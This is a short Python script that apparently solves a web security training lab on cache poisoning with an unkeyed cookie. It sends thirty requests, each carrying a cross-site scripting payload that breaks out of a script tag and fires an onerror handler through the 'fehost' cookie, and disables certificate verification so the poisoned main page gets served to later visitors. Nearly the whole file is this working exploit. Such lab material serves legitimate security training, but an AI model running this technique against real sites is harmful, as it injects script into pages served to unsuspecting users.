import requests
from colorama import Fore
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "Web cache poisoning with an unkeyed cookie"


def run(url, payload=None, proxies=None):
    url = url.rstrip('/')

    payload = """ "}</script><img src=1 onerror=alert(1)> """

    for counter in range(1, 31):
        print(
            Fore.WHITE + f"Poisoning the main page with an unkeyed cookie ({counter}/30).. ", end="\r", flush=True)
        cookies = {"fehost": payload}
        requests.get(url, cookies=cookies, verify=False, proxies=proxies)

    print(Fore.GREEN + "\nThe main page is poisoned successfully")
    return True
